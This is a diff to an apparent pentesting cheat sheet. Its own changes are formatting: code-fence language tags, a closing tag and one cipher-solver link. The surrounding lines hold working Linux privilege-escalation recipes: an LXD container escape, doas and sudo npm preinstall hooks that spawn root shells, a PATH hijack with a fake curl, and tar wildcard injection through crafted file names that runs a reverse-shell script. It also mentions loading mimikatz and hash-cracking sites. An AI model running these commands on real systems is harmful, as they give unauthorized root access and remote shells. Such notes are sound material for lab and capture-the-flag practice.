@@ -59,7 +59,7 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ### Linux Privilege Escalation:
 <details><summary> LXD container exploitation </summary> 
 
-```
+```bash
 wget archive
 lxc image import ./archive --alias myimage
 lxc image list
@@ -71,14 +71,14 @@ lxc exec ignite /bin/sh
 </details>
 <details><summary> with doas </summary>
 
-```
+```bash
 doas -u root openssl enc -in file
 doas -u root /bin/bash
 ```
 </details>
 <details><summary> with npm -u </summary>
 
-```
+```bash
 mkdir ~/tmp
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
 sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
@@ -87,7 +87,7 @@ sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 
 <details><summary>PATH</summary>
 
-```
+```bash
 echo /bin/sh > curl
 chmod 777 curl
 export PATH=/tmp:$PATH
@@ -98,7 +98,7 @@ export PATH=/tmp:$PATH
 
 <details><summary>tar</summary>
 
-```
+```bash
 cat > /home/andre/backup/rev << EOF
 #!/bin/bash
 rm /tmp/f
@@ -109,6 +109,7 @@ echo "" > "/home/andre/backup/--checkpoint=1"
 echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
 chmod +x rev
 ```
+</details>
 
 #### information gathering
 ```bash
@@ -418,6 +419,7 @@ load kiwi #download mimikatz
 - [free pass hash cracker](https://crackstation.net/)
 - [crack station](https://crackstation.net/)
 - [md5decrypt.net](https://md5decrypt.net/en/)
+- [vigenere brute force](https://www.guballa.de/vigenere-solver)
 
 #### Tools
 
